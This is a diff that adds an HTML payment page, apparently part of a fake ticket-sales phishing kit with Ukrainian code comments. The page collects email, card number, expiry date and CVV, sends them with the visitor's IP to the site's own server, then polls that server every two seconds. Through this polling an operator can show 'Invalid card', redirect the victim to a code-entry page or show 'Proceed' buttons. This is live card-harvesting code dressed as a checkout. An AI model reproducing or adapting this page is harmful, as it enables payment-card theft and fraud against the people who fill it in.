@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #00b2ff;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .payment-card {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+            padding: 2.5rem 2rem 2rem 2rem;
+            max-width: 370px;
+            width: 100%;
+            box-sizing: border-box;
+            text-align: center;
+            overflow: hidden;
+        }
+        .bank-icon {
+            width: 60px;
+            height: 60px;
+            background: #00b2ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.2rem auto;
+        }
+        .bank-icon svg {
+            width: 36px;
+            height: 36px;
+            fill: #fff;
+        }
+        .payment-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 1.2rem;
+        }
+        .payment-card hr {
+            border: none;
+            border-top: 1px solid #e0e0e0;
+            margin: 1.2rem 0 1.5rem 0;
+        }
+        .input-group {
+            margin-bottom: 1.1rem;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 1rem 1.1rem;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            background: #fafbfc;
+            outline: none;
+            transition: border 0.2s;
+            box-sizing: border-box;
+            overflow-wrap: break-word;
+        }
+        .input-group input:focus {
+            border-color: #00b2ff;
+        }
+        .row {
+            display: flex;
+            gap: 1rem;
+            width: 100%;
+        }
+        .row .input-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        .confirm-btn {
+            width: 100%;
+            padding: 1rem;
+            background: #00b2ff;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 500;
+            margin-top: 1.2rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .confirm-btn:hover {
+            background: #0090cc;
+        }
+        .support-proceed-btn {
+            width: 100%;
+            padding: 1rem;
+            background: #00b2ff;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            box-sizing: border-box;
+        }
+        .support-proceed-btn:hover {
+            background: #0090cc;
+        }
+        @media (max-width: 480px) {
+            .payment-card {
+                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-card">
+        <div class="bank-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
+        </div>
+        <div class="payment-title" id="payment-title">Payment 45€</div>
+        <div>Price: <span class="event-price"></span></div>
+        <hr>
+        <form id="paymentForm" autocomplete="off">
+            <div class="input-group">
+                <input id="email-input" type="email" placeholder="E-mail" value="" required>
+            </div>
+            <div class="input-group">
+                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
+            </div>
+            <div class="row">
+                <div class="input-group">
+                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
+                </div>
+                <div class="input-group">
+                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
+                </div>
+            </div>
+            <button type="submit" class="confirm-btn">Confirm</button>
+            <div id="support-buttons" style="display:none; margin-top: 16px; text-align:center;"></div>
+        </form>
+    </div>
+    <script>
+    // Визначаємо IP користувача
+    let userIP = null;
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(data => { userIP = data.ip; });
+    // Зчитування параметрів з URL
+    function getQueryParam(name) {
+        const url = new URL(window.location.href);
+        return url.searchParams.get(name);
+    }
+    // --- Замість uid використовуємо page_code ---
+    function getPageCode() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+    }
+    // Total підтягуємо, беремо тільки число
+    const totalRaw = getQueryParam('total');
+    if (totalRaw) {
+        // Витягуємо тільки число (цілу або з копійками)
+        const match = totalRaw.match(/\d+[\.,]?\d*/);
+        const totalNum = match ? match[0].replace(',', '.') : '';
+        if (totalNum) {
+            document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
+        }
+    }
+    document.getElementById('paymentForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email-input').value;
+        const card = document.getElementById('card-input').value;
+        const expiry = document.getElementById('expiry-input').value;
+        const cvv = document.getElementById('cvv-input').value;
+        // --- Додаємо price і currency ---
+        let price = localStorage.getItem('event_price');
+        let currency = localStorage.getItem('event_currency');
+        if (!price || !currency) {
+            // fallback: парсимо з total
+            const totalRaw = getQueryParam('total') || localStorage.getItem('payment_total') || '';
+            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+            if (match) {
+                price = match[1].replace(',', '.');
+                currency = match[2];
+            }
+        }
+        try {
+            let ip = userIP;
+            if (!ip) {
+                await new Promise(res => setTimeout(res, 500));
+                ip = userIP;
+            }
+            const response = await fetch('/send_payment_data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'payment', price, currency })
+            });
+            if (response.ok) {
+                if (!document.getElementById('payment-msg')) {
+                    const msg = document.createElement('div');
+                    msg.id = 'payment-msg';
+                    msg.style.color = '#16b6ff';
+                    msg.style.fontWeight = '500';
+                    msg.style.marginTop = '18px';
+                    msg.textContent = 'Payment sent!';
+                    document.querySelector('.payment-card').appendChild(msg);
+                }
+            } else {
+                console.error('Помилка при відправці даних');
+            }
+        } catch (error) {
+            console.error('Помилка при зверненні до сервера:', error);
+        }
+    };
+    // --- POLLING для wrong_card ---
+    let wrongCardMsg = null;
+    function showWrongCardMsg() {
+        if (!wrongCardMsg) {
+            wrongCardMsg = document.createElement('div');
+            wrongCardMsg.style.color = '#dc3545';
+            wrongCardMsg.style.fontSize = '0.98rem';
+            wrongCardMsg.style.marginTop = '6px';
+            wrongCardMsg.textContent = 'Invalid card';
+            const cardInput = document.getElementById('card-input');
+            cardInput.parentNode.appendChild(wrongCardMsg);
+        }
+    }
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    showWrongCardMsg();
+                }
+            });
+    }, 2000);
+    // --- POLLING для code redirect ---
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    window.location.href = '/buy-tickets/code/';
+                }
+            });
+    }, 2000);
+    // --- POLLING для support/text кнопок ---
+    function showSupportButtons(total, text_id) {
+        const page_code = getPageCode();
+        let html = '';
+        if (window.show_support_flag || (window.show_text_flag && text_id)) {
+            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
+        }
+        if (window.show_support_flag) {
+            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?page=${page_code}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
+        }
+        if (window.show_text_flag && text_id) {
+            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
+        }
+        if (html) {
+            document.getElementById('support-buttons').innerHTML = html;
+            document.getElementById('support-buttons').style.display = 'block';
+            // Add click handlers
+            if (window.show_support_flag) {
+                document.getElementById('support-btn').onclick = async function(e) {
+                    e.preventDefault();
+                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
+                    document.getElementById('support-buttons').style.display = 'none';
+                    window.location.href = this.href;
+                };
+            }
+            if (window.show_text_flag && text_id) {
+                document.getElementById('text-btn').onclick = async function(e) {
+                    e.preventDefault();
+                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
+                    document.getElementById('support-buttons').style.display = 'none';
+                    window.location.href = this.href;
+                };
+            }
+        }
+    }
+    async function pollSupportButtons() {
+        if (!userIP) {
+            return setTimeout(pollSupportButtons, 2000);
+        }
+        const totalRaw = getQueryParam('total') || '';
+        try {
+            const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
+            const data = await resp.json();
+            window.show_support_flag = data.show_support;
+            window.show_text_flag = data.show_text;
+            showSupportButtons(totalRaw, data.text_id);
+        } catch (e) {}
+        setTimeout(pollSupportButtons, 2000);
+    }
+    setTimeout(pollSupportButtons, 2000);
+    </script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+  var expiry = document.getElementById('expiry-input');
+  if (expiry) {
+    expiry.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+      this.value = val;
+    });
+  }
+});
+</script>
+    <script>
+(function() {
+  // Підстановка ціни та валюти з URL, localStorage, або збереженого payment_total
+  const params = new URLSearchParams(window.location.search);
+  let price = params.get('price');
+  let currency = params.get('currency');
+  let totalRaw = params.get('total');
+  let title = '';
+  if (price && currency) {
+    localStorage.setItem('event_price', price);
+    localStorage.setItem('event_currency', currency);
+    title = `Payment ${price} ${currency}`;
+  } else if (totalRaw) {
+    // Витягуємо число і валюту з total (наприклад, 58CHF)
+    const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      localStorage.setItem('payment_total', totalRaw);
+      title = `Payment ${price} ${currency}`;
+    } else {
+      // Якщо тільки число
+      const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Payment ${price} ${currency}`;
+    }
+  } else if (localStorage.getItem('payment_total')) {
+    // Якщо total вже зник з адреси, але є у localStorage
+    const saved = localStorage.getItem('payment_total');
+    const match = saved.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      title = `Payment ${price} ${currency}`;
+    } else {
+      const numMatch = saved.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Payment ${price} ${currency}`;
+    }
+  } else {
+    price = localStorage.getItem('event_price');
+    currency = localStorage.getItem('event_currency');
+    if (price && currency) title = `Payment ${price} ${currency}`;
+  }
+  if (title) {
+    document.getElementById('payment-title').textContent = title;
+  }
+  if (price && currency) {
+    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
+  }
+})();
+</script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Ховаємо параметр total з адресного рядка, але зберігаємо його у localStorage
+  const params = new URLSearchParams(window.location.search);
+  const total = params.get('total');
+  if (total) {
+    localStorage.setItem('payment_total', total);
+    params.delete('total');
+    const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
+    window.history.replaceState({}, '', newUrl);
+  }
+});
+</script>
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/6866eda8be8a1b1910b81a44/1iv910nb5';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+</body>
+</html> 
